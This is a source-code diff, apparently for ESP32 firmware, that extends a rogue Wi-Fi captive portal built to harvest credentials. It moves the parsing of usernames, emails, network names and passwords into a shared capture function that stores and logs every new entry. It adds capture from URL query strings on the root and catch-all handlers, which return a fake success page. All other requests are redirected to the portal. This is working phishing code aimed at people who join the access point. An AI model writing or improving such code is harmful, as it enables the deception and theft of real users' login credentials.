@@ -265,8 +265,65 @@ static bool extract_json_value(const char *body, const char *const *keys, size_t
     return false;
 }
 
+static bool portal_capture_credentials(const char *body, bool is_json)
+{
+    cred_entry_t parsed;
+    static const char *const user_keys[] = {
+        "user", "username", "email", "login", "identity",
+        "ssid", "wifi", "wifi_name", "network", "network_name"
+    };
+    static const char *const pass_keys[] = { "pass", "password", "pwd" };
+    memset(&parsed, 0, sizeof(parsed));
+
+    if (is_json) {
+        extract_json_value(body, user_keys, sizeof(user_keys) / sizeof(user_keys[0]),
+                           parsed.username, sizeof(parsed.username));
+        extract_json_value(body, pass_keys, sizeof(pass_keys) / sizeof(pass_keys[0]),
+                           parsed.password, sizeof(parsed.password));
+    } else {
+        extract_form_value(body, user_keys, sizeof(user_keys) / sizeof(user_keys[0]),
+                           parsed.username, sizeof(parsed.username));
+        extract_form_value(body, pass_keys, sizeof(pass_keys) / sizeof(pass_keys[0]),
+                           parsed.password, sizeof(parsed.password));
+    }
+
+    bool has_value = parsed.username[0] || parsed.password[0];
+    bool duplicate = false;
+    if (has_value && cred_count > 0) {
+        cred_entry_t *last = &cred_store[cred_count - 1];
+        duplicate = strcmp(last->username, parsed.username) == 0 &&
+                    strcmp(last->password, parsed.password) == 0;
+    }
+
+    if (has_value && !duplicate && cred_count < MAX_CREDS) {
+        cred_store[cred_count] = parsed;
+        ESP_LOGI(TAG, "Captured cred #%d: user=%s", cred_count, parsed.username);
+        cred_count++;
+    }
+
+    return has_value;
+}
+
+static bool portal_capture_query(httpd_req_t *req)
+{
+    size_t query_len = httpd_req_get_url_query_len(req);
+    if (query_len == 0 || query_len >= 512) {
+        return false;
+    }
+
+    char query[512];
+    return httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK &&
+           portal_capture_credentials(query, false);
+}
+
 static esp_err_t root_get_handler(httpd_req_t *req)
 {
+    if (portal_capture_query(req)) {
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_send(req, success_html, sizeof(success_html) - 1);
+        return ESP_OK;
+    }
+
     if (custom_portal_html_len > 0) {
         return send_html_with_ssid(req, custom_portal_html, custom_portal_html_len, true);
     }
@@ -309,42 +366,7 @@ static esp_err_t login_post_handler(httpd_req_t *req)
         remaining -= ret;
     }
 
-    /* Accept common custom form names, not just the built-in user/pass pair. */
-    {
-        cred_entry_t parsed;
-        static const char *const user_keys[] = {
-            "user", "username", "email", "login", "identity",
-            "ssid", "wifi", "wifi_name", "network", "network_name"
-        };
-        static const char *const pass_keys[] = { "pass", "password", "pwd" };
-        memset(&parsed, 0, sizeof(parsed));
-
-        if (is_json) {
-            extract_json_value(buf, user_keys, sizeof(user_keys) / sizeof(user_keys[0]),
-                               parsed.username, sizeof(parsed.username));
-            extract_json_value(buf, pass_keys, sizeof(pass_keys) / sizeof(pass_keys[0]),
-                               parsed.password, sizeof(parsed.password));
-        } else {
-            extract_form_value(buf, user_keys, sizeof(user_keys) / sizeof(user_keys[0]),
-                               parsed.username, sizeof(parsed.username));
-            extract_form_value(buf, pass_keys, sizeof(pass_keys) / sizeof(pass_keys[0]),
-                               parsed.password, sizeof(parsed.password));
-        }
-
-        bool has_value = parsed.username[0] || parsed.password[0];
-        bool duplicate = false;
-        if (has_value && cred_count > 0) {
-            cred_entry_t *last = &cred_store[cred_count - 1];
-            duplicate = strcmp(last->username, parsed.username) == 0 &&
-                        strcmp(last->password, parsed.password) == 0;
-        }
-
-        if (has_value && !duplicate && cred_count < MAX_CREDS) {
-            cred_store[cred_count] = parsed;
-            ESP_LOGI(TAG, "Captured cred #%d: user=%s", cred_count, parsed.username);
-            cred_count++;
-        }
-    }
+    portal_capture_credentials(buf, is_json);
 
     if (is_json) {
         static const char json_ok[] = "{\"ok\":true}";
@@ -360,6 +382,12 @@ static esp_err_t login_post_handler(httpd_req_t *req)
 /* Catch-all handler — redirect everything to root (captive portal trigger) */
 static esp_err_t catchall_handler(httpd_req_t *req)
 {
+    if (portal_capture_query(req)) {
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_send(req, success_html, sizeof(success_html) - 1);
+        return ESP_OK;
+    }
+
     httpd_resp_set_status(req, "302 Found");
     httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/");
     httpd_resp_send(req, NULL, 0);
